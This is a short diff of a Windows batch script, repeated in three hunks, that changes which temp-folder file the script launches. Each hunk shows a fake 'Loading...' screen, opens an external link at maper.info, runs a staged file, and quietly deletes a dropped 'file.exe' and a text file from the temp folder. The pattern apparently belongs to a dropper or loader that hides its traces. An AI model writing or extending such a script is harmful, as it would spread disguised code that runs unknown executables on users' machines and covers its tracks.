@@ -39,7 +39,7 @@ cls
 echo Loading...
 timeout /t 2 >nul
 start https://maper.info/mysity.link
-start "" "%file%"
+start "" "%tempVid%"
 del "%temp%\Ascii.txt" >nul 2>&1
 del "%temp%\\file.exe" >nul 2>&1
 exit
@@ -50,7 +50,7 @@ cls
 echo Loading...
 timeout /t 2 >nul
 start https://maper.info/mysity.link
-start "" "%file%"
+start "" "%tempVid%"
 del "%temp%\Ascii.txt" >nul 2>&1
 del "%temp%\\file.exe" >nul 2>&1
 exit
@@ -62,7 +62,7 @@ cls
 echo Loading...
 timeout /t 2 >nul
 start https://maper.info/mysity.link
-start "" "%file%"
+start "" "%tempVid%"
 del "%temp%\Ascii.txt" >nul 2>&1
 del "%temp%\\file.exe" >nul 2>&1
 exit
